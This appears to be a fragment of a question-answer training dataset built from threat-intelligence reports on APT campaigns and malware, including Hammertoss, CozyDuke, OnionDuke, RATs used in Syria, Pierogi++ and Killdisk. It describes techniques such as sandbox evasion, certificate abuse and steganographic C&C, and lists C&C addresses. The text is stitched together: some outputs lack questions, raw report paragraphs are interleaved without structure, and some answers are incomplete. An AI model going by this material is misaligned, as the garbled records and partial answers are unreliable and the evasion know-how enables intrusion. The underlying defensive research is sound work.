sought-after data or what appears to be a compromised network. The honey pot is designed to collect data on the intruder, while giving away nothing, or giving away something that is perceived as an acceptable loss to gain something greater in return.\nAttackers may also compromise a computer or network by using a Trojan horse, often known simply as a Trojan. A Trojan appears to perform a desirable function, while secretly performing malicious functions. Trojans can be used to gain remote access, destroy data, download data, serve as a proxy, falsify records, or shut down the target computer at will.  The Pentagon, defence-related think tanks, and defence-related contractors were the target of a combined spoofing and Trojan attack in 2008. Trojans were hidden in email attachments designed to look as if they were sent from a reliable source.  The Trojan was designed to bury itself into the system, covertly gather data, and send it to an internet address in China. Due to the ability of hackers to route their activity through foreign computers, security experts were unable to determine if China was the final destination, if it was an attempt at framing China, or if it was a state-sponsored activity (Waterman 2008).\nThis was not the first time US research facilities received spoofed emails with Trojans purportedly from China. In 2005 the Oak Ridge National Laboratory and Los Alamos National Laboratory became infected. No classified information was believed to have been\nobtained; however personal information of visitors from the years 1990 to 2004 was compromised. This included names, date of birth, and social security numbers. These two research facilities were originally constructed for sensitive nuclear weapons research during WWII. Today they are used 'for research in numerous areas including national security, nanotechnology, advanced materials, and energy' (Lasker 2005). In general, Cyber reconnaissance may be an attempt to attain victory conditions before battle. These intrusions, if undetected, allow intruders to identify vulnerabilities for future cyber attack. The cost of probing computer networks is low, given the lack of attribution, requiring as few as one hacker, and the ability to work from remote locations using off-the-shelf hardware.\nA rootkit is a toolkit hidden on a compromised computer. The rootkit can be a diverse set of programs, but invariably is designed to hide the fact that the computer has been compromised and defending itself once detected. These rootkits often hide themselves as seemingly innocuous drivers or kernel modules, depending on the details of the operating system and its mechanisms. In addition to covering the tracks of an intruder, they can allow easier access in the future by opening backdoors. They may also include an arsenal of sniffers, key loggers, and tools that relay email chat conversations. Rootkits may also serve as a staging ground for email spam distribution and DDoS attacks as a part of a larger botnet. In 2005, it was revealed that Sony BMG included rootkit software on their CDs. This software altered the Windows OS to allow access to the computer by anyone aware of the rootkits existence, presumably to enforce copyright protection. This example shows that corporations, too, can be a part of cyber attack or reconnaissance, furthering China's desire to create its own software and establish market dominance as opposed to being subjected to the US's. Numerous source codes for ready-made rootkits can be found on the internet. In 2006, alleged Chinese hackers infiltrated \"the Department of Commerce's Bureau of Industry and Security, which manages export licensing of military-use products and information\" using rootkits to allow privilege escalation. The agency spent millions of dollars on new, clean, hardware and software, because they could not restore the integrity of the compromised network (Tkacik 2007).\nRead the text above and answer this question: What methods can hackers use to mask their identity during a cyber attack, and how effective are these methods?",
    "output": "Hackers can mask their identity using proxy servers, which route information through multiple computers, making it difficult to trace the origin of the attack. For example, a Chinese hacker could route activity through computers in Brazil and Russia before attacking a target in the US, making it appear as though the attack came from Russia. Additional tools like Tor (The Onion Router), encryption, tunneling protocol, and wireless access points (hotspots) can add further layers of anonymity. While these methods can be effective, they require significant effort to trace back to the original source, potentially leading investigators through multiple countries and computers.",

    "output": "Persistence is a critical aspect of an adversary's attack lifecycle, allowing them to maintain their foothold on compromised systems despite interruptions or changes in the environment. In the case of the ChessMaster APT campaign, persistence is achieved through several techniques. One method is the use of second-stage payloads, which are variants of the ChChes malware that utilize similar entry points but different and encrypted command and control (C&C) communication channels. This ensures that even if the initial malware is detected and removed, the additional payloads can continue to maintain access to the compromised system. Furthermore, the use of runtime packers to obfuscate the ChChes malware and avoid detection demonstrates an effort to persist on the system by evading security measures. Additionally, the deployment of hacking tools, such as password recovery and dumping tools, enables the attackers to gain further access to sensitive information and move laterally within the network, thereby maintaining their persistence. Overall, the ChessMaster APT campaign showcases a range of persistence techniques aimed at ensuring continued access to compromised systems.",

    "instruction": "Medium Headline: OnionDuke\nIn October 2014, Leviathan Security Group disclosed that a Russia based Tor exit node was attaching malware onto the files that passed through it by wrapping legitimate executables with the malware executable. The technique increased the attacker's chance of bypassing integrity check mechanisms. The malware campaign is believed to have been active from at least February 2013 through spring 2015. OnionDuke does not operate like the other Duke campaigns; however, it does share some C&C infrastructure with the MiniDuke attacks.\nMoreover, unshared domains in both campaigns were registered using the same alias, John Kasai. As such, it stands to reason that OnionDuke is another Russian state sponsored APT group.\nOnionDuke attacks target government agencies in Central Europe. However, because it is unlikely that European government agencies are accessing Tor from their high value systems, the secondary distribution vector of the malware remains unclear. The malware has also been found targeting pirated software. It is possible that the campaign distributes the malware through scattershot attacks via the Tor network and torrent sites and through another yet unobserved vector, such as phishing or wateringhole attacks. The infection of Tor files appears to fail if the victim users a VPN channel that encrypts traffic. Systems infected with CozyDuke may be infected with OnionDuke if the former malware is used to deliver and execute the latter malware's dropper. It is possible that the OnionDuke attacks were conducted to infect a broad range of target to gather information for the other Duke campaigns and to build a botnet for the adversary.\nWhen traffic passes through the infected node, the dropper, TrojanDropper:W32/OnionDuke.A, is appended onto the legitimate files. The dropper contains a PE resource which appears as an embedded .GIF image file. In actuality, the resource is a .DLL file, Backdoor:W32/OnionDuke.B, which is then decrypted, written to disk, and executed. Next, the DLL decrypts an embedded configuration file, which attempts to contact a hardcoded C&C domain through HTTP(s) or through Twitter (if HTTP(s) fails). The domains appear to be legitimate websites that were compromised to deliver instructions and additional components to the malware. OnionDuke, like CozyDuke, is built upon a modular platform that was designed for versatility. The toolset delivered from the C&C server contains the information stealer, a DDOS module, a password stealing module, an information gathering module, and a social network (VKontakte) spamming component.\nMedium Headline: APT29/ Hammertoss / HammerDuke\nAPT29 is a new threat actor that operates during UTC+3 work hours. APT29 targets government organizations in an attempt to collect geopolitical data that could be of interest to Russia. APT29 might be a state sponsored threat group; however, the group is too new to exhibit definitive signs of state sponsorship.\nAPT29 employs anti-forensic techniques, they monitor analysis and remediation efforts, and they rely upon compromised C2C infrastructure. Apt29 embeds the Hammertoss commands into images using steganography. APT29 programs Hammertoss to operate to blend into normal target network traffic and normal target network traffic patterns. The\ngroup preconfigures Hammertoss to activate after a predetermined date and only communicates during specified hours.\nThere are two variants of Hammertoss, Uploader and tDiscoverer. Both variants receive their instructions from an embedded image. Uploader goes to a hard-coded C2C server address and downloads an image of a specific file size. tDiscoverer generates and visits a new Twitter handle every day from a preconfigured algorithm. It attempts to visit that page. If the actor has registered the handle, then it visits the page and looks for a tweet with a URL that indicates the location of its instructions and a hashtag that specifies the minimum size of the image file. After the number of bytes, the hashtag may also contain a string that the malware adds to its encryption key so that it can decrypt the data. If the actor has not registered the handle, then the malware waits until the next day and repeats the process with the next handle generated by the algorithm. The malware fetches the image from the URL. Uploader or tDiscoverer, decrypts the data hidden in the image, and processes the attackers' command. Commands include conducting reconnaissance on the victim system, executing commands via PowerShell, or uploading stolen data to a cloud storage service.\nMedium Headline: CozyDuke/ CozyCar/ CozyBear/ Office Monkeys/ Cozer/ EuroAPT\nThe CozyDuke group began attacking governments and associated organizations around 2011. CozyDuke is a very precise group and it has not been extensively profiled. It may have been developed or used by actors of the MiniDuke or OnionDuke APT groups. CozyDuke shares at least some infrastructure with these groups. Security firm F-Secure reports that CozyDuke, like the rest of the Duke family of malware, originates from a seven-year campaign that is affiliated with the Russian government. It is unclear whether the Duke family of malware is sponsored by the Russian government or developed and used by a mercenary criminal organization.\nCozy Duke attacks very specific governmental organizations and affiliated entities. CozyDuke mostly targets United States entities; however, government and commercial entities in Chechnya, Germany, South Korea, and Uzbekistan have also been targeted. CozyDuke is believed to be behind the late 2014 attacks on the United States Department of State and attacks against the White House.\nLike most APT's, CozyDuke attacks typically begin with a spear phishing email. Sometimes the emails are loaded with malicious Adobe Flash video attachments. In the past, the videos have been funny animal videos. Other times, the emails contain malicious links that deliver the user to websites that the attackers created to look like real sites. Otherwise, the email contains a ZIP file containing a decoy PDF document and a self-extracting RAR file.\nOnce the user opens the attachment or visits the link, the initial dropper is installed on the system. The initial dropper checks the system for security products, and will not install further malware if a program on the system matches software on its list. The dropper also runs processes to check if it is being run in a virtual machine or sandbox environment. If either check indicates an analysis environment, then the dropper exits. Otherwise, the dropper delivers an encrypted configuration file, and installs the CozyDuke components. The CozyDuke malware is signed with fake Intel and AMD digital certificates so that it appears legitimate to some security solutions.\nThe CozyDuke malware is a modular platform that consists of a core component, the CozyDuke backdoor, and modules tailored to its target. The platform includes multiple malware droppers and additional custom and open-source spyware tools. The CozyDuke main component establishes a persistent beachhead on the victim system, gathers system information, communicates with the C2 infrastructure, and manages the accompanying modules and scripts. The main component adds a registry value that is executed at system startup. It also obfuscates itself as a Windows service or scheduled task. Variants of the main component may also hijack the registry entry of a COM object \"SharedTaskScheduler\" so that the malware loads with the COM object.\nCozyDuke modules can execute arbitrary code, harvest victim credentials, gather system information, and take screenshots of the victim system. Some of the CozyDuke modules appear to have been developed in the same development environment as MiniDuke and OnionDuke. The platform also contains the CORESHELL and CHOPSTICK modules made popular in the Russian state-sponsored APT28 attacks. CORESHELL is a second stage backdoor that runs numerous anti-analysis procedures. CHOPSTICK is a modular implant that logs keystrokes, takes screenshots, and monitors network traffic.\nRecent variants of CozyDuke deliver SeaDuke and HammerDuke. SeaDuke is a cross platform backdoor that is written in Python. This expands the attackers' pool of victims to include Linux users. HammerDuke is a backdoor that connects to a Twitter account name and uses tweets from the account to locate C2 server addresses from which it receives commands or to which to delivers data.\nQ: How does APT29's Hammertoss malware utilize steganography and social media platforms to communicate with its command and control servers, and what are the two variants of Hammertoss?",
    "output": "APT29's Hammertoss malware utilizes steganography to embed commands into images. It communicates with its command and control servers through two variants: Uploader and tDiscoverer.

The Carbanak team does not just blindly compromise large numbers of computers and try to 'milk the cow' as other actors do, instead they act like a mature APT-group. They only compromise specific high-value targets and once inside the company networks, move laterally to hosts that can be monetized.\nA few days ago CSIS (<https://www.csis.dk/en/csis/blog/4710/>)published details about new Carbanak samples found in the wild.\nIn this blog we will describe the latest developments in the Carbanak story.\nBig Headline: Casino hotel hack\nAt the end of August, we detected an attempt to compromise the network of a casino hotel in the USA. The infection vector used in this attack may have been a spearphishing e-mail with a malicious attachment using an RTF-exploit or .SCR file. The attackers' aim was to compromise PoS servers used in payment processing.\nThe main backdoor used by attackers was the open-source Tiny Meterpreter.

This information helped the malware operators decide whether the infected computer was a valuable target. To ensure persistence, the latest sample of Win32/Spy.Agent.ORM attempted to exploit a vulnerability (CVE-2015-2426) in the OpenType manager module (ATMFD.dll), which was patched by Microsoft in MS15-078.

    "instruction": "Answer based on context:\n\nSmall Headline: 4.2 Syria\nThe use of RATs against the opposition has been a well-documented feature of the Syrian Civil War since the first reports were published in early 2012 [36, 39, 40, 32, 34]. The phenomenon is widespread, and in our experience, most members of the opposition know that some hacking is taking place. As summarized in Table 3, the attacks often include fake or maliciously packaged security tools; intriguing, or ideological, or movement-relevant content (e.g. lists of wanted persons). The seeding techniques and bait files suggest a good understanding of the opposition's needs, fears and behavior, coupled with basic familiarity with off-the-shelf RATs. In some cases attacks occur in a context that points to a more direct connection to one of the belligerents: the Syrian opposition has regularly observed that detainees' accounts begin seeding malware shortly after their arrest by government forces [41].\nResearchers and security professionals have already profiled many of these RATs, including DarkComet [42, 43], Black-shades Remote Controller [38], Xtreme RAT [44], njRAT [26], and ShadowTech [36]. Some are available for purchase by anyone, in contrast to \"government only\" FinSpy and RCS. For example, Xtreme RAT retails for e350, while a version of Black-shades lists for e40. Others, like DarkComet, are free. We have also observed cracked versions of these RATs on Arabic-language hacker forums, making them available with little effort and no payment trail. While the RATs are cheaper and less\nsophisticated than FinSpy and RCS, they share the same basic functionality, including screen capture, keylogging, remote monitoring of webcams and microphones, remote shell, and file exfiltration.\n6YahooMail and the iPhone mail client automatically load these remote images, especially in e-mails spoofed from trusted senders.\nIn the most common attack sequence we observed, illustrated with three examples in Figure 3, the attacker seeds malware via private chat messages, posts in opposition-controlled social media groups, or e-mail. These techniques often limit the world-visibility of malicious files and links, slowing their detection by common AV products. Typically, targets receive either (1) a PE in a .zip or .rar, (2) a file download link, or (3) a link that will trigger a drive-by download. The messages usually include text, often in Arabic, that attempts to persuade the target to execute the file or click the link.\nThe first attacks in Figure 3 date to 2012, and use bait files with a DarkComet RAT payload. These attacks share the same C&C, 216.6.0.28, a Syrian IP address belonging to the Syrian Telecommunications Establishment, and publicly reported as a C&C of Syrian malware since February 2012 [45]. The first bait file presents to the victim as a PDF containing information about a planned uprising in Aleppo. In fact the file is a Windows Screensaver (.scr) that masquerades as a PDF using Unicode RLO, rendering a name such as \".fdp.scr\" display to the victim as \".rcs.pdf.\" The second bait file is a dummy program containing DarkComet while masquerading as a Skype call encryption program, playing to opposition paranoia about government backdoors in common software. The third attack in Figure 3, observed in October 2013, entices targets with e-mails purporting to contain or link to videos about the current conflict, infecting victims with Xtreme RAT, and using the C&C tn1.linkpc.net.\nFor seeding, the attackers typically use compromised accounts (including those of arrested individuals) or fake identities masquerading as pro-opposition. Our illustration shows in abstract terms the use of Victim A's account to seed malware (\"Aleppo Plan\") via (say) Skype messages to Victim(s) Bn . In the cases of Opp. Member C and NGO Worker D (here, actual victims, not abstract), targeting was by e-mail from domains apparently belonging to opposition groups, indicating a potential compromise. One domain remains active, hosting a website of the Salafist Al-Nusra front [46], while the other appears dormant. Opp. Member C received a malicious file as an e-mail attachment, while NGO Worker D was sent a shortened link (url[.]no/Uu5) to a download from a directory of Mrconstrucciones[.]net, 7 a site that may have been compromised. Both attacks resulted in an Xtreme RAT infection.\nInterestingly, in the case of the fake Skype encryption the deception extended to a YouTube video from \"IT Security Lab\" [47] demonstrating the program's purported capabilities, as well as a website promoting the tool, skype-encryption.sytes.net. The attackers also constructed a basic, faux GUI for their \"Encryption\" program (see Figure 4). The fake GUI has a number of non-functional buttons like \"Encrypt\" and \"DeCrypt,\" which generate fake prompts. While distracted by this meaningless interaction, the victim's machine is infected with DarkComet 3.3 [32, 33].\nAnecdotally, campaign volume appears to track significant\n7Obfuscated to avoid accidental clicks on active malware URLs.\nknown vulnerability with no patch at the time that the e-mails were sent. Oracle released a patch 12 hours after activists began receiving these links.\nThe cedarkeyrv.com domain is associated with an RV park in Cedar Key, Florida. The website's hosting company told us that the site had apparently suffered a compromise, but did not have further details.\nThe exploit used in the attack appears to have been originally posted by a Kuwaiti user, njq8, on an Arabic-language exploit sharing site [65]. We contacted njq8, who told us that he had obtained the exploit elsewhere and modified it prior to posting. The attack downloaded an instance of SpyNet from isteeler.com (which from our inspection did not appear to have any legitimate content), which used the C&C storge.myftp.org. This same C&C occurred in another attack (Figure 6) targeting Relative of political detainee D; in that case, the payload was a freely-available RAT known as njRAT, written by the same njq8 as the exploit-poster discussed above. However, we did not find any other evidence suggesting njq8's involvement in either attack.\nMore SpyNet attacks: The domain hamas.sytes.net, which we previously saw used by two SpyNet samples, resolved to 67.205.79.177. Historically, dreems.no-ip.ca also resolved to this address. An unidentified dropper using this C&C targeted Journalist F;a SpyNet attack on Relative of political detainee D also used this C&C. In that latter case, the sample arrived via e-mail in a .rar attachment that contained an .scr file disguised as a Word document. The .scr file was a self-extracting archive that decompressed and ran both the bait document and the payload. The SMTP source of the e-mail was webmail.upload.bz.\nAppin: In early 2013 UAE H.R. activist E forwarded numerous documents that included a particular CVE-2012-0158 exploit for Microsoft Word. In all, these totaled 17 distinct hashes of documents, and 10 distinct hashes of payloads (some documents that differed in their hash downloaded the same payload). The exploits primarily downloaded instances of SpyNet from upload.bz, which for the most part communicated with C&C at sn.all-google.com. This domain was also used for C&C in other attacks, including that on Journalist C.\nTwo of the other CVE-2012-0158 exploits downloaded DarkComet from www.getmedia.us and www.technopenta.com after posting system information to random123.site11.com. All three domains match those used by an Indian cybermercenary group said to be linked to Appin Security Group [66]. The former two domains hosted content other than spyware (i.e., they may have been compromised). We alerted the owner of www.getmedia.us, who removed the payloads.\nMedium Headline: 5 Empirical characterization\nThe samples we received afforded us an opportunity to empirically characterize the use of FinFisher and Hacking Team around the world, enabling us to assess their prevalence, and identify other country cases that may warrant future investigation. We analyzed the samples and the behavior of their C&C\nservers to develop indicators (fingerprints) for how the servers respond to certain types of requests. We then scanned the full Internet IPv4 address space (\"/0\") for these, along with probing results found by past scans. In many cases we do not release the full details of our fingerprints to avoid compromising what may be legitimate investigations.\n\nHow do the attackers in Syria leverage Remote Access Trojans (RATs) to target opposition members, and what are some of the specific RATs used?",
    "output": "Attackers in Syria use RATs to target opposition members by seeding malware through private chat messages, social media groups, or emails. They often use fake or maliciously packaged security tools, or content that is ideologically relevant to the opposition. Specific RATs used include DarkComet, Blackshades Remote Controller, Xtreme RAT, njRAT, and ShadowTech. These RATs are either available for purchase or can be found in cracked versions on Arabic-language hacker forums. They share basic functionalities such as screen capture, keylogging, remote monitoring of webcams and microphones, remote shell, and file exfiltration.",

    "instruction": "Big Headline: Introduction\nThe attackers referred to as APT12 (also known as IXESHE, DynCalc, and DNSCALC) recently started a new campaign targeting organizations in Japan and Taiwan. APT12 is believed to be a cyber espionage group thought to have links to the Chinese People's Liberation Army. APT12\u2032s targets are consistent with larger People's Republic of China (PRC) goals. Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan. Additionally, the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure, as APT12 used the same strategy after compromising the New York Times in Oct 2012. Much like Darwin's theory of biological evolution, APT12 been forced to evolve and adapt in order to maintain its mission.\nThe new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog \"(<http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/>)Illuminating The Etumbot APT Backdoor.\" FireEye refers to the Etumbot backdoor as RIPTIDE. Since the release of the Arbor blog post, FireEye has observed APT12 use a modified RIPTIDE backdoor (<http://www.fireeye.com/blog/technical/2013/08/survival-of-the-fittest-new-york-times-attackers-evolve-quickly.html>)that we call HIGHTIDE. This is the second time FireEye has discovered APT12 retooling after a public disclosure. As such, FireEye believes this to be a common theme for this APT group, as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations.\nFireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT. Both backdoors were dropped from malicious documents built utilizing the \"Tran Duy Linh\" exploit kit, which exploited CVE-2012-0158. These documents were also emailed to organizations in Japan and Taiwan. While APT12 has previously used THREEBYTE, it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE. Similarly, WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified. However, the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12.\nRead the text above and answer this question: What are the characteristics of the new campaign conducted by APT12, and how do these characteristics align with broader geopolitical interests?",
    "output": "The new campaign conducted by APT12 targeted organizations in Japan and Taiwan, aligning with broader People's Republic of China (PRC) goals and self-interests in Taiwan. This campaign utilized modified backdoors like HIGHTIDE, which is an evolved version of the previously known RIPTIDE backdoor. Additionally, the campaign involved the use of malicious documents exploiting CVE-2012-0158, delivered via email. These characteristics demonstrate APT12's strategic alignment with PRC objectives and its ability to adapt and evolve in response to public exposure and changing cybersecurity landscapes.",

    "output": "Reliance on traditional signature-based detection (antivirus) is insufficient because, at the time of discovery, TRISIS was undetected by all antivirus engines. Instead, a more proactive approach is required. For instance, Yara signatures can be used to identify TRISIS. Those signatures also detect any binary compiled with py2exe, as any such tool within an ICS or SIS environment is an outlier and immediately suspect. Additionally, proactive baselining of known files, applications, services, USB insertions, and user accounts can find deviations that could detect TRISIS files on the system.",

    "instruction": "Big Headline: Executive Summary\nOverlaps in targeting, malware characteristics, and long-term malware evolutions post 2018 suggest that the Gaza Cybergang sub-groups have likely been consolidating, possibly involving the establishment of internal and/or external malware supply lines.\nGaza Cybergang has upgraded its malware arsenal with a backdoor that we track as Pierogi++, first used in 2022 and seen throughout 2023.\nRecent Gaza Cybergang activities show consistent targeting of Palestinian entities, with no observed significant changes in dynamics since the start of the Israel-Hamas war.\nSentinelLabs' analysis reinforces the suspected ties between Gaza Cybergang and WIRTE, historically considered a distinct cluster with loose relations to the Gaza Cybergang.\nBig Headline: Micropsia and Pierogi++ Target Hamas Opposition\nThe Gaza Cybergang umbrella has (<https://blog.talosintelligence.com/arid-viper-targets-palestine/>)continuously (<https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/mantis-palestinian-attacks>)targeted Israeli and Palestinian entities preceding the Israel-Hamas war. We observed additional activities spanning from late 2021 to late 2023 aligned with previous research. Our visibility into these activities, and the theme and language of the used lure and decoy documents, indicate that they were primarily targeting Palestinian entities. The majority involved malware variants of the staple Micropsia family.\nAmong the Micropsia family malware, we observed its Delphi and Python-based variants deploying decoy documents written in Arabic and focussing on Palestinian matters, such as the Palestinian cultural heritage and political events. Many of the associated C2 domain names, such as bruce-ess[.]com and wayne-lashley[.]com, reference public figures,\nwhich aligns with the known domain naming conventions of the group. To support further collective tracking of Gaza Cybergang activities, we focus at the end of the report on listing previously unreported Micropsia indicators.\nDecoy document\nAmong the Micropsia activities we identified a backdoor that we assess is based on a malware first reported in 2020 and named (<https://www.cybereason.com/blog/research/new-cyber-espionage-campaigns-targeting-palestinians-part-2-the-discovery-of-the-new-mysterious-pierogi-backdoor>)Pierogi. This backdoor, which we labeled Pierogi++, is implemented in C++, and we observed its use in 2022 and over 2023. The malware is typically delivered through archive files or weaponized Office documents on Palestinian matters, written in English or Arabic.\nMalicious documents distributing Pierogi++\nThe documents distributing Pierogi++ use macros to deploy the malware, which then typically masquerades as a Windows artifact, such as a scheduled task or a utility application. The malware implementation is embedded either in the macros or in the documents themselves, often in Base64-encoded form.\nOffice macro deploying Pierogi++\nPierogi++ executables also masquerade as politically-themed documents, with names such as \"The national role of the revolutionary and national councils in confronting the plans for liquidation and Judaization\", \"The situation of Palestinian refugees in Syria refugees in Syria\", and \"The Ministry of State for Wall and Settlement Affairs established by the Palestinian government\".\nWe assess that Pierogi++ is based on the Pierogi backdoor, whose variants are implemented in Delphi and Pascal. Pierogi and Pierogi++ share similarities in code and functionalities, such as strings, reconnaissance techniques, and deployment of decoy documents, some also seen in Micropsia malware.\nString indicating that no anti-virus solution has been detected: Pierogi++ (Tm9BVg== decodes to NoAV)\nMicropsia\nFurther, Pierogi++ samples implement in the same order the same backdoor functionalities as Pierogi: taking screenshots, command execution, and downloading attacker-provided files.\nWhen handling backdoor commands, some Pierogi++ samples use the strings download and screen, whereas earlier Pierogi samples have used the Ukrainian strings vydalyty, Zavantazhyty, and Ekspertyza. This raised suspicions at the time of potential external involvement in Pierogi's development. We have not observed indicators pointing to such involvement in the Pierogi++ samples we analyzed.\nPierogi++ backdoor strings\nMost of the Pierogi++ C2 servers are registered at Namecheap and hosted by Stark Industries Solutions LTD, aligning with previous infrastructure management practices of the Gaza Cybergang umbrella. The backdoor uses the  library for exchanging data with the C2 server, a technique that we do not often observe in Gaza Cybergang's malware arsenal.\nUse of the curl library\nPierogi++ represents a compelling illustration of the continuous investment in maintenance and innovation of Gaza Cybergang's malware, likely in an attempt to enhance its capabilities and evade detection based on known malware characteristics.\nBig Headline: From Molerats to Arid Viper And Beyond\nFollowing the first report on the Pierogi backdoor in February 2020, late 2020 and 2021 mark the association of the backdoor and its infrastructure with Arid Viper. The Micropsia activity linked to Arid Viper, which led to the (<https://unit42.paloaltonetworks.com/pymicropsia/>)discovery of the then-new PyMicropsia malware in December 2020, includes Pierogi samples. Further historical Pierogi samples use the escanor[.]live and nicoledotso[.]icu domains for C2 purposes, which have been associated with Arid Viper in  and (<https://about.fb.com/wp-content/uploads/2021/04/Technical-threat-report-Arid-Viper-April-2021.pdf>)April 2021. The latest variant of Pierogi is Pierogi++, which we observed targeting Palestinian entities in 2022 and over 2023 \u2013 this targeting is typical for Arid Viper.\nOur investigations into malware used by Gaza Cybergang prior to 2022, which share capabilities, structure, and infrastructure with Pierogi, resulted in a multitude of samples implemented in Delphi, Pascal, and C++. This highlights the frequent adoption of different development paradigms by Gaza Cybergang and aligns with the  by Facebook, which associates these variants with Arid Viper and tracks them using different names under the broader Micropsia malware family, such as Glasswire, Primewire, and fgref.\nMalware attributions\nLater in June 2021, the LastConn malware, which has been  as part of activities attributed to the TA402 cluster, was assessed with high confidence to be an updated version of SharpStage.\nBased on our followup investigation into recent 2023 (<https://www.proofpoint.com/us/blog/threat-insight/ta402-uses-complex-ironwind-infection-chains-target-middle-east-based-government>)TA402 activity targeting Middle Eastern government entities, we highlight concrete overlaps in malware used by TA402 and a lesser-known threat actor named WIRTE. First  in April 2019, WIRTE was initially considered to be a distinct cluster but later  with low confidence to the Gaza Cybergang umbrella (primarily based on the use of decoys on Palestinian matters, which are typical for the Gaza Cybergang constituent sub-groups).\nWIRTE is known for using a unique custom user agent for C2 communication when staging malware, with the value of the rv field likely being an intrusion identifier. WIRTE's stagers encapsulate C2 communication attempts in an infinite loop, separated by sleep periods of randomly generated lengths within defined lower and upper boundaries. We observe the same unique user agent format and C2 communication pattern in TA402's .NET malware stagers.\nUser agent and C2 communication in 2020 WIRTE malware\nUser agent and C2 communication in 2022 TA401 malware\nThe involvement of malware artifacts previously seen only in the context of WIRTE indicates a likely relation between the TA402, WIRTE, and Gaza Cybergang clusters. This aligns with the latest TA402 attribution assessment as a cluster overlapping with Gaza Cybergang and WIRTE.\nRead the text above and answer this question: What are the key indicators that suggest a consolidation among the Gaza Cybergang sub-groups, and how might this impact their operational efficiency and sophistication?",

Symantec, a division of , has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors.\nTrojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiper\nOnce run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities.\n\nQ: Why did the attackers behind Trojan.Killdisk use legitimate certificates from Hermetica Digital Ltd and EaseUS Partition Master to sign their malicious files? How does this tactic impact the detection and mitigation efforts of cybersecurity professionals?",
    "output": "A: The attackers behind Trojan.Killdisk used legitimate certificates from Hermetica Digital Ltd and EaseUS Partition Master to sign their malicious files to make the malware appear legitimate and evade detection by traditional antivirus software. By signing the malware with these certificates, the attackers aimed to exploit the trust that security systems place in digitally signed files, thereby increasing the likelihood that the malware would go undetected. This tactic impacts the detection and mitigation efforts of cybersecurity professionals by making it more challenging to distinguish between legitimate and malicious files based solely on digital signatures. Cybersecurity professionals need to employ advanced threat detection methods, such as behavioral analysis and machine learning, to identify and respond to such sophisticated attacks.",

The c&c IP address, 198.100.113.27, can be seen there. Other log files showed that \"Toot\" is using virtual machines for his tests.\nWe can also see the system: Microsoft Windows XP SP3. The \"P\" field is the language ID.\n1028 means \"Chinese traditional\". We have also seen tests run by \"toot\" with a language ID of 2052, which is \"Chinese simplified\".\nThe \"M\" field is probably used for versioning. It is a hardcoded string in the binary.\nAfter these tests, we could see some real connections to a victim using this RAT. Here is a follow-up of the commands launched by the bot controller, in a standard command-line shell:\nThe attacker goes on like this, using his tools, and then ends the communication with this RAT on that computer.\nPlease note that at this point, the attacker has at least the privileges of a local administrator, since he is allowed to write content in the system32 folder of a Windows XP system. He could also gain the credentials to a sensitive e-mail account.\nIn addition to all information already shown, we saw Toot connect to an account on a cloud service named \"Baidu Drive\". The e-mail address linked to this account is (QQ-ID: 2589315828).

Moreover, we have strong suspicions that there is not a single individual nicknamed \"Trees and snow\" but rather two programmers nicknamed \"Trees\" and \"Snow\". \"Trees\" could also be \"Cold\". We noticed that the symbol for this word is translated differently according to the context it is used in. Once again, we lack Chinese language skills.\nWe identify the two nicknames on the current campaign as Automn Snow (\u79cb\u96ea) and Cold Air Kiss ( \u98ce\u543b\u5bd2).\nWhile we are confident that these people are indeed the developers of both PittyTiger and CT RAT malware, we are not sure they belong to the PittyTiger group. These developers might just have been hired to develop these RATs. They might also just be selling it to the PittyTiger group. There is no trace of usage from other attacking groups, we believe the PittyTiger RAT is exclusively used by this group of attackers.\nMedium Headline: ROLES AND ORGANIZATION\nAccording to indicators we gathered and threat activities profiling we have some hypothesis on the way the group is conducting its operations.\nWe have strong evidence of a bot operator position.

This position could imply a communication channel with another manager. We named this position 'Chen', in relation with several references of this common Chinese name in c&c WHOIS and other investigation materials.\nWe have some suspicion of a customer relationship manager position that may act as an interface between a customer and Chen.

    "instruction": "Write an answer to the following question: How does the North Korean APT group UNC2970 utilize process injection in their malware tools, specifically in the context of the SIDESHOW backdoor?",
    "output": "Process injection is a technique used by adversaries to execute arbitrary code in the address space of a separate live process, potentially evading process-based defenses and elevating privileges. In the context of the SIDESHOW backdoor, used by the North Korean APT group UNC2970, process injection plays a significant role in its capabilities. According to the available information, SIDESHOW supports at least 49 commands, one of which includes payload execution via process injection. This implies that SIDESHOW can inject malicious code into legitimate processes, allowing it to access the process's memory, system/network resources, and possibly elevated privileges. By leveraging process injection, SIDESHOW can mask its execution under a legitimate process, making it more challenging for security products to detect its malicious activities. Furthermore, SIDESHOW's ability to manipulate services, registry, scheduled tasks, and firewall settings could be used to establish persistence, potentially allowing it to maintain its presence on the compromised system even after a reboot. Overall, the use of process injection in SIDESHOW demonstrates the sophistication and evasion techniques employed by UNC2970 in their malware tools.",

